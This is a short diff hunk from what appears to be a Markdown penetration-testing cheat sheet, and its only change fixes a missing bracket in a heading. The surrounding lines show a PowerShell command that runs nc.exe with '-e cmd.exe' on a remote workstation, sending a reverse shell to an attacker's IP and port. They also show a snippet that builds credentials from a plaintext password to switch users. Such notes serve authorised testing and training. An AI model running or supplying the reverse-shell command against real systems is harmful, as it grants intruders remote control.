@@ -182,7 +182,7 @@ $creds = New-Object System.Management.Automation.PSCredential -ArgumentList ($us
 Invoke-Command -ComputerName WORKSTATION -Credential $creds -ScriptBlock {C:\path\to\nc.exe IP PORT -e cmd.exe}
 ```
 
-### [change users on powershell
+### [change users on powershell]
 ```
 $username = "<domain>\<username>" ; $pw = "<password>"
 $password = $pw | ConvertTo-SecureString -AsPlainText -Force
